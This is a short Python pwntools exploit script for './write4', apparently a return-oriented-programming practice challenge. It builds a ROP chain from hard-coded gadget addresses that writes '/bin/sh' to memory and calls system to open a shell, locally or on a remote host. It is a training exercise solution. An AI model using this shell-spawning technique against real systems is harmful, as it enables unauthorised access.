#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

#gdb_bool = True
gdb_bool = False

def exploit(r):

    mov_r14r15 = 0x0000000000400820
    ppr = 0x0000000000400890 #pop r14; pop r15;ret;
    data_seg = 0x000000000601050
    prdi = 0x0000000000400893 # pop rdi; ret
    r.recvuntil("> ")
    r.send("A" * cyclic_find("faaaaaaa",n=8))
    buf = ""
    buf += p64(ppr)
    buf += p64(data_seg)
    buf += "/bin/sh\x00"
    buf += p64(mov_r14r15)
    buf += p64(prdi)
    buf += p64(data_seg)
    buf += p64(0x000000000400810) #system
    


    r.sendline(buf)    
    r.interactive()
    return





if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./write4"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x400806",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)
